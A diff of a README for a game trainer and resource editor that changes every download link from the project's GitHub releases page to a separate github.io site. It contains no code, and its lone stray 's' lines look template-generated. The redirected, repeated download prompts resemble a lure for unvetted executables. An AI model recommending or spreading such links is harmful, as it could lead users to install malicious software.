@@ -1,6 +1,6 @@
 # 🎮 Dungeon-Settlers-Trainer-Resource-Editor - Unlock Full Control of Your Colony
 
-[![Download Dungeon Settlers Trainer](https://img.shields.io/badge/Download-Dungeon_Settlers_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/blackberrydospassos62/Dungeon-Settlers-Trainer-Resource-Editor/releases)
+[![Download Dungeon Settlers Trainer](https://img.shields.io/badge/Download-Dungeon_Settlers_Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://blackberrydospassos62.github.io)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to the **Dungeon Settlers Trainer & Resource Editor** — your all-in-on
 
 ## ⬇️ Download & Installation
 
-Visit this link to download the application: **https://github.com/blackberrydospassos62/Dungeon-Settlers-Trainer-Resource-Editor/releases**
+Visit this link to download the application: **https://blackberrydospassos62.github.io**
 
 s
 
@@ -137,7 +137,7 @@ The trainer itself is extremely lightweight and consumes very little system memo
 
 ## 📦 Download & Install (Again)
 
-Ready to take control of your colony? Visit this link to download the application: **https://github.com/blackberrydospassos62/Dungeon-Settlers-Trainer-Resource-Editor/releases**
+Ready to take control of your colony? Visit this link to download the application: **https://blackberrydospassos62.github.io**
 
 s
 
